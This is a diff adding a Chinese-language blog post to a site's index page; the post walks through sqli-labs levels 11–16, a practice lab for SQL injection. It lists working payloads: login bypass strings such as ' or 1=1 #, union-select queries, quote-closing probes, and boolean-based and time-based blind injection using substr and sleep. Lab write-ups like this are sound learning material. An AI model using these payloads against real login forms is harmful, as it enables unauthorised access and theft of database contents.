@@ -152,6 +152,132 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-sql-labs-less11-16" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/18/sql-labs-less11-16/">sql-labs less11-16</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/18/sql-labs-less11-16/" class="archive-article-date">
+  	<time datetime="2020-10-18T08:21:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3>less-11</h3>
+<p>
+select username,password from users where username='$username' && password='$password' limit 0,1;
+后台执行的数据库语句大概就是这样(●'◡'●)，所以当我们提交输入的内容时：
+select username,password from users where username='' or 1=1 # && password='$password' limit o,1;
+
+</p><p>@$sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and password=’$passwd’ LIMIT 0,1”;</p>
+<p>在#以后的内容就被注释掉，前面的内容因为or 1=1恒成立，所以语句就成立，我们此时以admin的用户登录。<br>那么接下来我们尝试用get注入中用到的其他的语句代替or 1=1 进行注入。</p>
+<p>1admin’union select 1,database()#<br>@$sql=”SELECT username, password FROM users WHERE username=’admin’union select 1,database()# and password=’$passwd’ LIMIT 0,1”;</p>
+<p></p>
+
+<h3>
+less-12</h3>
+<p>
+进行尝试
+在用户名那里输入：1\ （会报出错误信息：near '"1\") and password=("") LIMIT 0,1'）可以判断使用
+“） --+ 进行注入
+</p>
+<h3>
+less-13</h3>
+<p>
+进行尝试
+在用户名那里输入：1\    报错：use near ''1\') and password=('') LIMIT 0,1' at line 1
+判断使用 ‘）--+ 注入
+</p>
+<h3>
+less-14
+</h3>
+<p>
+1\尝试    报错：use near '"1\" and password="" LIMIT 0,1' at line 1   看出双引号的错误
+</p>
+<h3>
+less-15
+</h3>
+<p>
+1\   ')   ")  尝试  但是没有错误提示，报错注入不行
+所以，得换个思路测试：时间注入、boolean、union
+
+</p><p>可我们不知道用户怎么办？在POST型中要判断字符型注入，最快的方法就是利用“万能语句” 即<br>1 or 1=1 – #             1) or 1=1– #            1)) or 1=1– #<br>1’ or 1=1 – #            1’) or 1=1– #           1’) or 1=1– #<br>1” or 1=1 – #           1”) or 1=1– #          1”) or 1=1– #<br>一般POST型使用1’ or 1=1 – #和1” or 1=1 – # 成功的概率最大因单双引号引起的闭合问题更大点</p>
+<p>boolean注入<br>‘ or (ord(substr(database(),1,1))&gt;100) #</p>
+<p>uname=1’ or left(database(),1)&gt;’a’ – #&amp;passwd=1          返回正确</p>
+<p>uname=1’ or left(database(),1)&gt;’s’ – #&amp;passwd=1          返回错误</p>
+<p>uname=1’ or left(database(),1)=’s’ – #&amp;passwd=1          返回正确  </p>
+<p>时间注入<br>uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit</p>
+<p>延时注入<br>1’ or if(1,1,sleep(3)) – #</p>
+<p></p>
+<h3>
+less-16
+</h3>
+<p>
+与less15差不多的套路
+利用万能语句,初步确认了这是一道带括号的双引号字符注入： 
+1") or 1=1 -- #
+</p>
+
+<h1>总结</h1>
+<h3>GET</h3>
+![](/image/less-get.png)
+<p>get型直接就试：\。这个字符探错
+</p><h3>POST</h3>
+![](/image/less-post.png)
+
+
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/18/sql-labs-less11-16/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-mongodb-node-js-express" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
